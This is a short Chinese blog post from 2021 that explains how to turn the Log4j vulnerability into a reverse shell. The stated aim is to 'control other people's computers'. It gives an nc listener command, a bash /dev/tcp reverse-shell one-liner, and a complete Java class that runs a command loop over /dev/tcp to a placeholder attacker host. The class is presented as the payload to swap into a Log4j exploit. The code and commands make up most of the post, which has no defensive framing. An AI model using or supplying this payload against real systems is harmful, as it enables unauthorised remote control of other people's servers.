---
title: 使用Log4j漏洞反弹shell
tags: 信息安全
categories: 信息安全
description: 如何使用正确的方式复现Log4j漏洞，利用Log4j漏洞进行攻击，反弹SHell，控制别人的电脑
keywords: 'Log4j漏洞,漏洞,攻击,Apache漏洞,Log4j,反弹shell,java反弹shell,log4j反弹shell'
abbrlink: bedb840d
date: 2021-12-24 18:47:39
---

前面我讲过log4j的漏洞，具体文章在这里：https://baifachuan.com/posts/659dfd84.html

如果利用这个漏洞想去控制别人的服务器，有一种方式就是可以反弹shell ， 反弹shell，其实不复杂也不陌生。

```
nc -lvp 6767
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::6767
Ncat: Listening on 0.0.0.0:6767
```

用nc直接监听一个端口，然后：

```
bash -i >& /dev/tcp/127.0.0.1/6767 0>&1
```

直接就反弹了一个shell到自己的电脑上，所以如果利用log4j漏洞的话就是我把前面弹出计算器的程序的代码，换成反射shell去自己的服务器。
这样的话就可以在自己的服务器上控制别人的服务器，这里稍微有点差异的地方就是需要研究java 如何反射shell。

java总体的安全性还可以，没有那么多底层工具，所谓的反射shell不过是使用Runtime去执行一个管道命令，但是需要确保整个程序不终止。

基本就是这样了：

```
package com.fcbai.log4j.example;

public class JavaShellExec {

    public JavaShellExec(){
        try{
            Runtime r = Runtime.getRuntime();
            String cmd[]= {"/bin/bash","-c","exec 5<>/dev/tcp/xx.xx.xx.xx/xxxx;cat <&5 | while read line; do $line 2>&5 >&5; done"};
            Process p = r.exec(cmd);
            p.waitFor();
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        JavaShellExec e = new JavaShellExec();
    }
}
```

有了这个反射shell代码，就可以直接利用这个漏洞去得到远程shell。
